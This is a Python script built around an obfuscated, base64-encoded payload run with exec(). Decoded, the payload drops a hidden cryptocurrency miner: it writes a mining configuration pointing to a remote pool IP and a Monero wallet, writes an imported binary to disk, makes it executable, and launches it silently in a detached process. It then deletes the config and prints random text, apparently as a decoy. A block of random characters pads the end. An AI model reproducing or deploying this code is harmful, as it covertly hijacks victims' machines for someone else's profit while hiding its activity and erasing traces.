import base64
from b2DgDj5KuPyHS import binary_data 
log_file = "lF6IuFKEaGbP.log"
exec(base64.b64decode('CmltcG9ydCBvcwppbXBvcnQgcmFuZG9tCmltcG9ydCBzdHJpbmcKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHN5cwppbXBvcnQgdGltZQppbXBvcnQgb3MKCmxvZ19wYXRoID0gb3MucGF0aC5qb2luKG9zLmdldGN3ZCgpLCBsb2dfZmlsZSkKY29uZmlnX3BhdGggPSBvcy5wYXRoLmpvaW4ob3MuZ2V0Y3dkKCksIGxvZ19maWxlWzI6XSkKeG1fcGF0aCA9IG9zLnBhdGguam9pbihvcy5nZXRjd2QoKSwgbG9nX2ZpbGVbNDpdKQpjb25maWc9IiIiCnsKICAgICJhcGkiOiB7CiAgICAgICAgImlkIjogbnVsbCwKICAgICAgICAid29ya2VyLWlkIjogbnVsbAogICAgfSwKICAgICJodHRwIjogewogICAgICAgICJlbmFibGVkIjogZmFsc2UsCiAgICAgICAgImhvc3QiOiAiMTI3LjAuMC4xIiwKICAgICAgICAicG9ydCI6IDAsCiAgICAgICAgImFjY2Vzcy10b2tlbiI6IG51bGwsCiAgICAgICAgInJlc3RyaWN0ZWQiOiB0cnVlCiAgICB9LAogICAgImF1dG9zYXZlIjogZmFsc2UsCiAgICAiYmFja2dyb3VuZCI6IHRydWUsCiAgICAiY29sb3JzIjogdHJ1ZSwKICAgICJ0aXRsZSI6IGZhbHNlLAogICAgInJhbmRvbXgiOiB7CiAgICAgICAgImluaXQiOiAtMSwKICAgICAgICAiaW5pdC1hdngyIjogMCwKICAgICAgICAibW9kZSI6ICJhdXRvIiwKICAgICAgICAiMWdiLXBhZ2VzIjogZmFsc2UsCiAgICAgICAgInJkbXNyIjogdHJ1ZSwKICAgICAgICAid3Jtc3IiOiB0cnVlLAogICAgICAgICJjYWNoZV9xb3MiOiBmYWxzZSwKICAgICAgICAibnVtYSI6IHRydWUsCiAgICAgICAgInNjcmF0Y2hwYWRfcHJlZmV0Y2hfbW9kZSI6IDEKICAgIH0sCiAgICAiY3B1IjogewogICAgICAgICJlbmFibGVkIjogdHJ1ZSwKICAgICAgICAiaHVnZS1wYWdlcyI6IHRydWUsCiAgICAgICAgImh1Z2UtcGFnZXMtaml0IjogZmFsc2UsCiAgICAgICAgImh3LWFlcyI6IG51bGwsCiAgICAgICAgInByaW9yaXR5IjogbnVsbCwKICAgICAgICAibWVtb3J5LXBvb2wiOiB0cnVlLAogICAgICAgICJ5aWVsZCI6IHRydWUsCiAgICAgICAgIm1heC10aHJlYWRzLWhpbnQiOiA3NCwKICAgICAgICAiYXNtIjogdHJ1ZSwKICAgICAgICAiYXJnb24yLWltcGwiOiBudWxsLAogICAgICAgICJjbi8wIjogZmFsc2UsCiAgICAgICAgImNuLWxpdGUvMCI6IGZhbHNlCiAgICB9LAogICAgIm9wZW5jbCI6IHsKICAgICAgICAiZW5hYmxlZCI6IGZhbHNlLAogICAgICAgICJjYWNoZSI6IHRydWUsCiAgICAgICAgImxvYWRlciI6IG51bGwsCiAgICAgICAgInBsYXRmb3JtIjogIkFNRCIsCiAgICAgICAgImFkbCI6IHRydWUsCiAgICAgICAgImNuLzAiOiBmYWxzZSwKICAgICAgICAiY24tbGl0ZS8wIjogZmFsc2UsCiAgICAgICAgInBhbnRoZXJhIjogZmFsc2UKICAgIH0sCiAgICAiY3VkYSI6IHsKICAgICAgICAiZW5hYmxlZCI6IGZhbHNlLAogICAgICAgICJsb2FkZXIiOiBudWxsLAogICAgICAgICJudm1sIjogdHJ1ZSwKICAgICAgICAiY24vMCI6IGZhbHNlLAogICAgICAgICJjbi1saXRlLzAiOiBmYWxzZSwKICAgICAgICAicGFudGhlcmEiOiBmYWxzZSwKICAgICAgICAiYXN0cm9id3QiOiBmYWxzZQogICAgfSwKICAgICJkb25hdGUtbGV2ZWwiOiAxLAogICAgImRvbmF0ZS1vdmVyLXByb3h5IjogMSwKICAgICJsb2ctZmlsZSI6IG51bGwsCiAgICAicG9vbHMiOiBbCiAgICAgICAgewogICAgICAgICAgICAiYWxnbyI6IG51bGwsCiAgICAgICAgICAgICJjb2luIjogbnVsbCwKICAgICAgICAgICAgInVybCI6ICIyMTYuMTczLjc3Ljg5OjMzNDMiLAogICAgICAgICAgICAidXNlciI6ICI0QUpoa2g0bThuWDdEOWZ5aEhxc2ptTHlFTGNWYjJ4c0NpNzlTZEoxQmRKSGdtekJMdDZ2aDZDQzFBdDVFQ3RocXM5aVNjTGNxR1BlVTRWQ2ZqNzJSb1RDS1N6bkJwdyIsCiAgICAgICAgICAgICJwYXNzIjogIngiLAogICAgICAgICAgICAicmlnLWlkIjogbnVsbCwKICAgICAgICAgICAgIm5pY2VoYXNoIjogZmFsc2UsCiAgICAgICAgICAgICJrZWVwYWxpdmUiOiB0cnVlLAogICAgICAgICAgICAiZW5hYmxlZCI6IHRydWUsCiAgICAgICAgICAgICJ0bHMiOiB0cnVlLAogICAgICAgICAgICAidGxzLWZpbmdlcnByaW50IjogbnVsbCwKICAgICAgICAgICAgImRhZW1vbiI6IGZhbHNlLAogICAgICAgICAgICAic29ja3M1IjogbnVsbCwKICAgICAgICAgICAgInNlbGYtc2VsZWN0IjogbnVsbCwKICAgICAgICAgICAgInN1Ym1pdC10by1vcmlnaW4iOiBmYWxzZQogICAgICAgIH0KICAgIF0sCiAgICAicHJpbnQtdGltZSI6IDYwMDAsCiAgICAiaGVhbHRoLXByaW50LXRpbWUiOiA2MDAwLAogICAgImRtaSI6IHRydWUsCiAgICAicmV0cmllcyI6IDUsCiAgICAicmV0cnktcGF1c2UiOiA1LAogICAgInN5c2xvZyI6IGZhbHNlLAogICAgInRscyI6IHsKICAgICAgICAiZW5hYmxlZCI6IGZhbHNlLAogICAgICAgICJwcm90b2NvbHMiOiBudWxsLAogICAgICAgICJjZXJ0IjogbnVsbCwKICAgICAgICAiY2VydF9rZXkiOiBudWxsLAogICAgICAgICJjaXBoZXJzIjogbnVsbCwKICAgICAgICAiY2lwaGVyc3VpdGVzIjogbnVsbCwKICAgICAgICAiZGhwYXJhbSI6IG51bGwKICAgIH0sCiAgICAiZG5zIjogewogICAgICAgICJpcHY2IjogZmFsc2UsCiAgICAgICAgInR0bCI6IDMwCiAgICB9LAogICAgInVzZXItYWdlbnQiOiBudWxsLAogICAgInZlcmJvc2UiOiAwLAogICAgIndhdGNoIjogdHJ1ZSwKICAgICJyZWJlbmNoLWFsZ28iOiBmYWxzZSwKICAgICJiZW5jaC1hbGdvLXRpbWUiOiAyMCwKICAgICJwYXVzZS1vbi1iYXR0ZXJ5IjogZmFsc2UsCiAgICAicGF1c2Utb24tYWN0aXZlIjogZmFsc2UKfQoiIiIKCmRlZiBwcmludGxuKHRleHQpOgogICAgdHJ5OgogICAgICAgIGlmICdzdHJlYW1saXQnIG5vdCBpbiBzeXMubW9kdWxlczoKICAgICAgICAgICAgaW1wb3J0IHN0cmVhbWxpdCBhcyBzdAogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHN0ID0gc3lzLm1vZHVsZXNbJ3N0cmVhbWxpdCddCiAgICAgICAgc3Qud3JpdGUodGV4dCkKICAgIGV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgICAgICBwcmludCh0ZXh0KQoKZGVmIGV4ZWNfZnJvbSgpOgogICAgc3VicHJvY2Vzcy5Qb3BlbihmInNsZWVwIDMgJiYgcm0gLWYge2NvbmZpZ19wYXRofSIsIHNoZWxsPVRydWUpCiAgICMgc3VicHJvY2Vzcy5Qb3BlbihmInNsZWVwIDMgJiYgcm0gLWYge3htX3BhdGh9Iiwgc2hlbGw9VHJ1ZSkKICAgIHJldHVybiBzdWJwcm9jZXNzLlBvcGVuKAogICAgICAgIFt4bV9wYXRoLCItLWNvbmZpZyIsY29uZmlnX3BhdGhdLAogICAgICAgIHN0ZGluPXN1YnByb2Nlc3MuREVWTlVMTCwKICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZOVUxMLAogICAgICAgIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwsCiAgICAgICAgc3RhcnRfbmV3X3Nlc3Npb249VHJ1ZSwKICAgICkKCmRlZiBtYWluKCk6CiAgICBwcmludGxuKCdzdHJhdC4uJykKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oY29uZmlnX3BhdGgsICd3KycpIGFzIGZpbGU6CiAgICAgICAgICAgIGZpbGUud3JpdGUoY29uZmlnKQogICAgICAgIHdpdGggb3Blbih4bV9wYXRoLCd3YisnKSBhcyBmaWxlOgogICAgICAgICAgICBmaWxlLndyaXRlKGJpbmFyeV9kYXRhKQogICAgICAgIG9zLmNobW9kKGNvbmZpZ19wYXRoLCAwbzc1NSkKICAgICAgICBvcy5jaG1vZCh4bV9wYXRoLCAwbzc1NSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCiAgICB0cnk6CiAgICAgICAgXz1leGVjX2Zyb20oKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKICAgIGNoYXJhY3RlcnMgPSBzdHJpbmcuYXNjaWlfbGV0dGVycyArIHN0cmluZy5kaWdpdHMKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdGltZS5zbGVlcCgwLjUpCiAgICAgICAgcHJpbnRsbignJy5qb2luKHJhbmRvbS5jaG9pY2VzKGNoYXJhY3RlcnMsIGs9MTIpKSkKCm1haW4oKQoK').decode('utf-8'))
decv345="""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"""
